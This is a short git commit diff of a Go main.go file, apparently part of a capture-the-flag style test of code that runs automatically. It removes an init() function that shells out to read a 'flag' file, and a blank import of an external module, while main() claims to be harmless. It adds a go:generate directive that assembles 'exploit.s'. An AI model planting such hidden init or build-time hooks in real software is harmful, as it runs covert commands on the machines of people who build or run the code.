48ce0bc162d8f10b3b4d76944ecd0620a44dcca0
QGrain <zhiyuzhang1999@163.com>
2023-04-22 19:36:38 +0800

    third test

--- main.go
+++ main.go
@@ -1,23 +1,6 @@
 package main
 
-import (
-	"fmt"
-	"os/exec"
-
-	_ "github.com/QGrain/ezgo-exp2"
-)
-
-func init() {
-	cmd := exec.Command("/bin/sh", "-c", "echo 'from main' && cat flag")
-	output, err := cmd.CombinedOutput()
-
-	if err != nil {
-		fmt.Println("Error:", err)
-	} else {
-		fmt.Println("Output:", string(output))
-	}
-}
+//go:generate go tool asm -S exploit.s
 
 func main() {
-	fmt.Println("This is a harmless main function.")
 }
